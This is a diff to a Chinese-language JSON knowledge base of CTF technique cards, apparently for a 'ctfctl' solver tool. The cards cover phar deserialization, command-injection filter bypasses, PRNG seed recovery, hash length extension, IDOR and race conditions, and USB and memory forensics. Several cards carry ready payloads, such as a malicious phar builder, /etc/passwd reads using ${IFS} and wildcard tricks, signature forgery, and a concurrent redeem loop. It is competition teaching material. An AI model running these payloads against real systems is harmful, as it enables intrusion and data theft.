+    "php -d phar.readonly=0 -r '$p=new Phar(\"x.phar\");$p[\"a\"]=new Evil();$p->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");'",
+    "ctfctl req get \"$U/?file=phar://uploads/x.gif/a\""
+   ],
+   "tools": [
+    "php",
+    "phpggc"
+   ],
+   "related_rules": [
+    "php"
+   ],
+   "corpus": {
+    "technique": "php_phar",
+    "files": 33,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 29,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 4,
+     "JorianWoltjer__practical-ctf": 0,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 0,
+     "p4-team__ctf": 0,
+     "ctf-wiki__ctf-wiki": 0
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md",
+     "Des-CTF-Knowledge-main/PHP反序列化漏洞总结.idx.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "PHP 手册：Phar 归档",
+     "url": "https://www.php.net/manual/en/book.phar.php"
+    }
+   ]
+  },
+  {
+   "id": "rce-filter-bypass",
+   "title": "命令执行/沙箱绕：过滤了就用构造",
+   "phase": "rce",
+   "tags": [
+    "web",
+    "rce"
+   ],
+   "signals": [
+    "能用执行点但空格/关键字/字母数字被过滤",
+    "报错里出现 disable_functions 或 seccomp",
+    "参数被 waf 拦但 payload 结构看着没错"
+   ],
+   "mechanism": "三类绕法：①分隔符与空格（${IFS}、%09、<、换行）②函数/命令名构造（通配符 /???/??t、变量拼接、异或取反、自增）③能力限制绕（disable_functions 用 LD_PRELOAD/GC/换组件执行；seccomp 只能 open/read/write 时改用 orw shellcode）。",
+   "steps": [
+    "先确认「哪一层在拦」：是 waf（请求头/状态码特征）、应用过滤（报错文案）还是系统限制（phpinfo 看 disable_functions）",
+    "空格被拦 → ${IFS}、$IFS$9、%09、<",
+    "关键字被拦 → 通配符、引号拼接、base64 管道、变量替换",
+    "disable_functions → LD_PRELOAD（自己编译 .so）/ GC UAF / 用别的组件执行；seccomp → 改用打开-读-写链"
+   ],
+   "cmds": [
+    "ctfctl req get \"$U/?cmd=cat$IFS/flag*\"",
+    "ctfctl req get \"$U/?cmd=/???/??t%20/etc/passwd\"",
+    "ctfctl req get \"$U/?cmd=c''at%20/etc/passwd\""
+   ],
+   "tools": [
+    "phpinfo 页面",
+    "gcc"
+   ],
+   "related_rules": [
+    "rce"
+   ],
+   "corpus": {
+    "technique": "rce_noalnum",
+    "files": 236,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 214,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 0,
+     "JorianWoltjer__practical-ctf": 0,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 0,
+     "p4-team__ctf": 0,
+     "ctf-wiki__ctf-wiki": 22
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "PayloadsAllTheThings: Command Injection 绕过",
+     "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+    }
+   ]
+  },
+  {
+   "id": "prng-predict",
+   "title": "伪随机数预测：拿到种子就能算 flag",
+   "phase": "crypto",
+   "tags": [
+    "crypto",
+    "misc"
+   ],
+   "signals": [
+    "flag/token 由 random/mt_rand 生成",
+    "题目给出若干「随机」输出",
+    "源码里有 srand(time())/seed"
+   ],
+   "mechanism": "MT19937（PHP mt_rand、Python random、Ruby）是确定性算法：给出 624 个 32 位输出即可完整还原内部状态，之后所有输出可预测；PHP 的 mt_rand 还有已知种子（seed 由 time 生成时可直接爆破时间戳）。",
+   "steps": [
+    "先确定是哪种 PRNG 与截断方式（range 会取模，取模会丢信息）",
+    "PHP mt_rand：用 php_mt_seed 爆种子（时间范围小的话秒出）",
+    "Python random：用 624 个 getrandbits(32) 输出重建状态（randcrack / 手写 untemper）",
+    "LCG 型（自实现）直接解线性方程反推参数"
+   ],
+   "cmds": [
+    "php_mt_seed 1234567890   # 拿到的输出反查种子",
+    "python3 -c \"from randcrack import RandCrack;print('见 randcrack 用法')\"",
+    "ctfctl codec extract --hex64   # 从题目文本里抠出连续输出"
+   ],
+   "tools": [
+    "php_mt_seed",
+    "randcrack",
+    "z3-solver"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "prng",
+    "files": 240,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 164,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 22,
+     "JorianWoltjer__practical-ctf": 3,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 23,
+     "p4-team__ctf": 13,
+     "ctf-wiki__ctf-wiki": 15
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/SSRF漏洞.md",
+     "Des-CTF-Knowledge-main/php代码审计.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "MT19937 状态恢复原理（开源实现 randcrack）",
+     "url": "https://github.com/tna0y/Python-random-module-cracker"
+    }
+   ]
+  },
+  {
+   "id": "length-extension",
+   "title": "哈希长度扩展：MAC=H(secret+msg) 的经典破法",
+   "phase": "crypto",
+   "tags": [
+    "crypto"
+   ],
+   "signals": [
+    "签名形式是 md5/sha1(secret + 消息)",
+    "服务端只返回或校验哈希值",
+    "知道 secret 长度（或能爆破长度）"
+   ],
+   "mechanism": "MD5/SHA1/SHA256 的 Merkle–Damgård 结构可以直接从 H(secret+msg) 续算 H(secret+msg+padding+extension)，不需要知道 secret —— 只要知道它的长度。HMAC 不存在这个问题（所以别把它当 HMAC）。",
+   "steps": [
+    "确认签名是 H(secret+msg) 而不是 HMAC（源码里看拼接方式）",
+    "用 hash_extender/hashpump 输入原哈希、原消息、追加内容、secret 长度",
+    "把「原消息+填充」编码进参数（注意 URL/binary 编码），提交新签名",
+    "secret 长度不确定就 1..32 逐个试（每次一个请求）"
+   ],
+   "cmds": [
+    "hash_extender --data 'user=guest' --secret 16 --append '&admin=1' --format sha256 --signature <原签名>",
+    "python3 -c \"import hmac,hashlib;print(hmac.new(b'k', b'user=guest&admin=1', hashlib.sha256).hexdigest())  # HMAC 就不会被扩展攻击\""
+   ],
+   "tools": [
+    "hash_extender",
+    "hashpump"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "length_ext",
+    "files": 21,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 9,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 6,
+     "JorianWoltjer__practical-ctf": 1,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 0,
+     "p4-team__ctf": 3,
+     "ctf-wiki__ctf-wiki": 2
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2022_pwnhub冬季赛_writeup_by_Arr3stY0u.full.md",
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2022西湖论剑_IoT-AWD_赛题官方_WriteUp_（上篇）：一号固件&二号固件.full.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "Merkle–Damgård 长度扩展解释",
+     "url": "https://en.wikipedia.org/wiki/Length_extension_attack"
+    }
+   ]
+  },
+  {
+   "id": "usb-hid-forensics",
+   "title": "USB 键鼠流量：HID 报告还原按键",
+   "phase": "misc",
+   "tags": [
+    "forensics",
+    "pcap"
+   ],
+   "signals": [
+    "pcap 里有 USB 流量（usb.capdata / URB_INTERRUPT in）",
+    "题目说「键盘/鼠标」",
+    "流量里全是 8 字节一组的短包"
+   ],
+   "mechanism": "USB HID 键盘每帧 8 字节：[修饰键, 保留, 按键1..6]，把 keycode 按 HID 表映射回字符（注意 Shift 与大小写）；鼠标是 [按键, dx, dy, 滚轮]，常用来画轨迹或配合点击。",
+   "steps": [
+    "tshark 过滤出设备与端点：-Y 'usb.capdata || usbhid.data'",
+    "把 capdata 提出来（去掉冒号），按 8 字节切分",
+    "用 HID 键码表映射成字符（Shift 时取大写/符号位）",
+    "鼠标题把 dx,dy 画成图（matplotlib 散点/连线）就能看到字或图"
+   ],
+   "cmds": [
+    "tshark -r kb.pcap -Y 'usb.capdata' -T fields -e usb.capdata | tr -d ':' | tail -n +1",
+    "tshark -r kb.pcap -Y 'usbhid.data' -T fields -e usbhid.data | head",
+    "python3 -c \"print('按 8 字节切分后查 HID 表（见 kb 卡里的映射）')\""
+   ],
+   "tools": [
+    "tshark",
+    "wireshark",
+    "usbhid-dump"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "usb_traffic",
+    "files": 517,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 174,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 30,
+     "JorianWoltjer__practical-ctf": 31,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 200,
+     "p4-team__ctf": 52,
+     "ctf-wiki__ctf-wiki": 30
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "USB HID 用法表（键码）",
+     "url": "https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf"
+    }
+   ]
+  },
+  {
+   "id": "memory-forensics",
+   "title": "内存镜像取证：进程→文件→剪贴板",
+   "phase": "misc",
+   "tags": [
+    "forensics",
+    "memory"
+   ],
+   "signals": [
+    "给了 mem.raw / .dmp / .vmem",
+    "题目提到「内存/进程/崩溃转储」",
+    "镜像很大但 strings 就有线索"
+   ],
+   "mechanism": "内存里留着进程列表、命令行、打开的文件内容、注册表 hive、剪贴板与网络连接。Volatility3 用符号表解析这些结构；但很多时候 strings + grep 就已经够（flag 常明文躺在内存里）。",
+   "steps": [
+    "先 strings | grep -i 'flag\\|ctf' 快速试一把（最省时间）",
+    "vol -f mem.raw windows.info 确认镜像类型与版本",
+    "pslist/pstree 看进程与命令行；cmdline 常直接写 flag 或密码",
+    "filescan + dumpfiles 导出文件；clipboard/registry 插件看剪贴板与注册表"
+   ],
+   "cmds": [
+    "strings -n 6 mem.raw | grep -iE 'flag|ctf\\{' | head",
+    "vol -f mem.raw windows.pslist",
+    "vol -f mem.raw windows.cmdline",
+    "vol -f mem.raw windows.filescan | grep -i flag"
+   ],
+   "tools": [
+    "volatility3",
+    "bulk_extractor",
+    "sleuthkit"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "memory_forensics",
+    "files": 43,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 28,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 0,
+     "JorianWoltjer__practical-ctf": 1,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 1,
+     "p4-team__ctf": 2,
+     "ctf-wiki__ctf-wiki": 11
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2023_强网杯_writeup_by_Arr3stY0u.full.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "Volatility3 插件文档",
+     "url": "https://volatility3.readthedocs.io/"
+    }
+   ]
+  },
+  {
+   "id": "web-logic-idor",
+   "title": "逻辑漏洞与越权：改一个 id 就够",
+   "phase": "session",
+   "tags": [
+    "web",
+    "logic"
+   ],
+   "signals": [
+    "接口带 id/user/uid/file_id 之类参数",
+    "页面说不许访问但接口本身有响应",
+    "有「次数/额度/价格/状态」这类可被绕的业务字段"
+   ],
+   "mechanism": "校验与使用分离：比如先查 available 再扣减，中间可并发；或前端只隐藏按钮、后端不查权限。改参数、改顺序、并发、负数、精度截断都是同一类思路。",
+   "steps": [
+    "把每个接口的 id 换成别人的/不存在的/超大值，看响应差异（注意 200 也可能是「假成功」）",
+    "读接口直接打（前端不显示 ≠ 后端不实现）",
+    "对「先检查后扣减」的逻辑并发打（ctfctl 起多进程同发）",
+    "业务字段试负数/极大值/小数/边界值"
+   ],
+   "cmds": [
+    "ctfctl req get \"$U/api/user?id=1\"  # 换成别人的 id",
+    "ctfctl diff live \"$U/api/user\" --field id --a 1 --b 2",
+    "for i in $(seq 1 20); do ctfctl req post \"$U/api/redeem\" -d 'code=X' & done; wait"
+   ],
+   "tools": [
+    "ffuf",
+    "ctfctl"
+   ],
+   "related_rules": [
+    "authz"
+   ],
+   "corpus": {
+    "technique": "web_logic",
+    "files": 65,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 53,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 2,
+     "JorianWoltjer__practical-ctf": 2,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 4,
+     "p4-team__ctf": 2,
+     "ctf-wiki__ctf-wiki": 2
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/SSRF漏洞.md",
+     "Des-CTF-Knowledge-main/文件上传漏洞.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "OWASP: Broken Access Control",
+     "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    }
+   ]
   }
  ],
  "_evidence": {
-  "_comment": "kb 卡片 corpus 的来源：scripts/harvest_writeups.py 在这批语料上的实测命中。口径：文件计数（同一文件命中多次算 1）、大小写不敏感子串/正则、每来源内部按内容 sha1 去重、跳过语料根/一层的索引文件名。",
-  "files_total": 2420,
-  "bytes_total": 25252016,
+  "_comment": "kb 卡片 corpus 的来源：scripts/harvest_writeups.py 在这批语料上的实测命中。口径：文件计数（同一文件命中多次算 1）、大小写不敏感子串/正则（见 data/techniques.json）、每来源内部按内容 sha1 去重、跳过语料根/一层的索引文件名。按来源分开看百分比，别拿一套语料当全站分布。",
+  "files_total": 3791,
+  "bytes_total": 69183966,
   "fetched": "2026-10-06",
-  "generated_by": "python3 scripts/harvest_writeups.py count --corpus <4 套语料> --json research/kb-evidence.json"
+  "sources_counted": 7,
+  "note": "r3kapig/writeup 抓取失败（codeload 404），未计入"
  }
 }
